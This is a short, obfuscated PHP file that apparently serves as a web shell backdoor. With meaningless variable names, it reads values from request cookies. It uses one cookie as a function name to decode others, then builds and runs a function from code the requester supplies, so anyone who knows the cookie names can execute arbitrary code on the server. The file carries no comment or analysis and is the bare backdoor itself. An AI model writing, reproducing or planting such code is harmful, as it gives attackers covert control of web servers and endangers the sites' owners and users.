<?php

$bwnv=$_COOKIE;
$zbu=$bwnv[bmdk];
if($zbu){
	$lamq=$zbu($bwnv[tnts]);$dyq=$zbu($bwnv[meuf]);$oys=$lamq("",$dyq);$oys();
}